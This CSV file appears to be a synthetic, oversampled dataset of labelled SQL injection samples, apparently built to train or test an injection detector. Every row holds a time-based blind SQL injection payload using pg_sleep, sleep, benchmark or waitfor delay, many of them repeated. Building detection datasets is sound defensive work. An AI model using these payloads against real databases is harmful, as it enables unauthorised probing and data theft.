id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001474,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,3.4093428061819213
SMOTE_001475,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000003,1.9019871018034051
SMOTE_001476,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,2.641343117966894
SMOTE_001477,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,1.8296691034605101
SMOTE_001478,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,1.4903781073614537
SMOTE_001479,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,2.345166704273307
SMOTE_001480,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,2.0269097619830974
SMOTE_001481,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000011,0.010518652308832387
SMOTE_001482,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000021,1.960064189377033
SMOTE_001483,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,2.5430555245437985
SMOTE_001484,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,0.5693700160044367
SMOTE_001485,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,2.2589462507889113
SMOTE_001486,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,1.0170812722137192
SMOTE_001487,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.2918067530965658
SMOTE_001488,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,1.5695012452978123
SMOTE_001489,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,0.775247784458238
SMOTE_001490,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,2.0640870540640046
SMOTE_001491,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000005,1.5034997242092218
SMOTE_001492,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,1.2240526540161178
SMOTE_001493,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,2.8240310387027336
SMOTE_001494,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,1.25857911873042
SMOTE_001495,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,2.589630383490097
SMOTE_001496,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000011,2.2368473047403676
SMOTE_001497,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.9670978570849492
SMOTE_001498,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,2.5703415303976804
SMOTE_001499,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,2.4705747190304153
SMOTE_001500,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,0.012487443829687575
SMOTE_001501,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000019,0.7190589779758051
SMOTE_001502,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,0.8648844954181091
SMOTE_001503,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000029,0.9465060755955699
SMOTE_001504,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,1.8670207136414616
SMOTE_001505,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,0.7323439154805511
SMOTE_001506,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000015,3.4128770866043716
SMOTE_001507,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,3.2458671744172594
SMOTE_001508,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,0.5485649294925399
SMOTE_001509,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.8822448418226569
SMOTE_001510,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,1.342726996846803
SMOTE_001511,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000026,1.8891451582147758
SMOTE_001512,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,0.23147136896174136
SMOTE_001513,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,2.1975325848978726
SMOTE_001514,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,0.15984402954667754
SMOTE_001515,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,0.42419797741507137
SMOTE_001516,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,2.3903798799946103
SMOTE_001517,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,1.7524082925933298
SMOTE_001518,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000021,2.695749530524114
SMOTE_001519,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,0.5334471692907664
SMOTE_001520,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,2.6307909963174834
SMOTE_001521,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,2.52908838702978
SMOTE_001522,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000031,1.3186384551633628
SMOTE_001523,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000022,0.6140459024743435
SMOTE_001524,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,0.709367179555627
SMOTE_001525,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.9677812738761836
SMOTE_001526,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,0.5470459815381327
SMOTE_001527,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,2.3208158420689697
SMOTE_001528,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,0.11740099843684096
SMOTE_001529,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,1.1504283780801465
SMOTE_001530,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,1.5967799569846246
SMOTE_001531,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,0.6026456833984982
SMOTE_001532,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,3.4229395553561686
SMOTE_001533,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,1.6332041553391068
SMOTE_001534,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,1.3917296389427296
SMOTE_001535,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000019,1.525358521629946
SMOTE_001536,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,2.9109070445746155
SMOTE_001537,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,2.252729483866748
SMOTE_001538,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000019,2.624327037150153
SMOTE_001539,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.6421518371397005
SMOTE_001540,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.06920657943437757
SMOTE_001541,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,0.03771147959651626
SMOTE_001542,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,1.692121856179654
SMOTE_001543,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,0.7383487630471373
SMOTE_001544,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000027,0.9774311393254698
SMOTE_001545,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,0.2649153958100095
SMOTE_001546,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,1.9760152542572933
SMOTE_001547,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,0.3947068983273814
SMOTE_001548,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000018,0.7657319639858254
SMOTE_001549,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,2.540341722523761
SMOTE_001550,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000022,0.9922618024412998
SMOTE_001551,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000009,3.396190802588754
SMOTE_001552,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,0.11759658932350775
SMOTE_001553,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000015,1.8393993776621227
SMOTE_001554,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,1.396969271505216
SMOTE_001555,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000027,2.0844339685340305
SMOTE_001556,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000022,0.5517322726076641
SMOTE_001557,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,1.0576311014791977
SMOTE_001558,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,0.4179848414029904
SMOTE_001559,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.2740240350849156
SMOTE_001560,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,1.7773535878790174
SMOTE_001561,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,1.674301987074571
SMOTE_001562,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,1.0064908338499579
SMOTE_001563,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,0.9522478285164266
SMOTE_001564,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,1.0824517565875178
SMOTE_001565,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000021,2.5396516653589694
SMOTE_001566,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000009,2.505279997262443
SMOTE_001567,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000005,3.0624099258367323
SMOTE_001568,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,1.8205264527188643
SMOTE_001569,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,0.019483701200033135
SMOTE_001570,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,1.30096699005108
SMOTE_001571,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,2.718588467022493
SMOTE_001572,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000015,2.3339630807730223
SMOTE_001573,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,0.2727069844505439
SMOTE_001574,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000015,3.4079338424082906
SMOTE_001575,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000011,0.0807199026687201
SMOTE_001576,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,1.7442460611843749
SMOTE_001577,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,2.215371044422033
SMOTE_001578,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,1.5039207537981216
SMOTE_001579,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,1.3841351808998972
SMOTE_001580,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,0.2904746386626536
SMOTE_001581,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,2.565409834542281
SMOTE_001582,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,1.7875047418610537
SMOTE_001583,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,1.5311400395139887
SMOTE_001584,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,1.785029942823493
SMOTE_001585,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,0.3725159271113677
SMOTE_001586,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,0.4180820565629507
SMOTE_001587,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,0.24003760123644283
SMOTE_001588,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,1.1912916433041352
SMOTE_001589,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,0.6855344430295399
SMOTE_001590,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000031,0.6751648510235428
SMOTE_001591,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,0.5911893138683402
SMOTE_001592,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000003,0.5468698613306365
SMOTE_001593,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000021,1.5939163156748126
SMOTE_001594,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,1.5525259684790211
SMOTE_001595,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,0.6744795548031765
SMOTE_001596,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.26579929862754476
SMOTE_001597,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,2.0545133331512844
SMOTE_001598,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,0.37036152970473213
SMOTE_001599,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,1.0739202086487836
SMOTE_001600,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,0.6793393240599646
SMOTE_001601,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000021,1.393611543559265
SMOTE_001602,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000011,1.4648598238960662
SMOTE_001603,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,1.4036016027158995
SMOTE_001604,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000027,1.373256389875703
SMOTE_001605,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000026,1.821685455574493
SMOTE_001606,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,0.6667337196956824
SMOTE_001607,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,0.05528237990078358
SMOTE_001608,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.07582330432516558
SMOTE_001609,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,0.990144766989535
SMOTE_001610,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,1.484229288306312
SMOTE_001611,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,1.0582213605565007
SMOTE_001612,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000003,0.6782603509881956
SMOTE_001613,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000009,1.017877458138068
SMOTE_001614,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,1.204707003832163
SMOTE_001615,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,1.4555852281000556
SMOTE_001616,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,1.689874216301377
SMOTE_001617,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000031,0.7575859754275117
SMOTE_001618,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,2.0160565658631295
SMOTE_001619,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.009330722486381426
SMOTE_001620,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,1.0051649529132192
SMOTE_001621,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000018,0.26496456808160035
SMOTE_001622,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,0.8772600133054086
SMOTE_001623,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000005,2.121434092084939
SMOTE_001624,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,4.394582372844609
SMOTE_001625,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,0.31584289594250714
SMOTE_001626,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,1.7682607008200235
SMOTE_001627,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000019,2.0764033922665943
SMOTE_001628,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,0.13567624938378361
SMOTE_001629,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,0.28738101474442784
SMOTE_001630,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000029,0.9152736551030913
SMOTE_001631,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,0.5839590490874711
SMOTE_001632,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000015,4.034012029031386
SMOTE_001633,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.15910013906175796
SMOTE_001634,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000026,2.273034181817358
SMOTE_001635,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,2.3548925870164985
SMOTE_001636,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,0.24654437324069295
SMOTE_001637,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,0.07976227025675851
SMOTE_001638,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,2.342435826054275
SMOTE_001639,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,1.6647057242347105
SMOTE_001640,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000027,0.826110730089491
SMOTE_001641,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000011,2.310712650218549
SMOTE_001642,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,1.0610602852067588
SMOTE_001643,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,2.0675807401616324
SMOTE_001644,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000015,0.830369736644441
SMOTE_001645,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,2.630960718504276
SMOTE_001646,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,1.9114386211774492
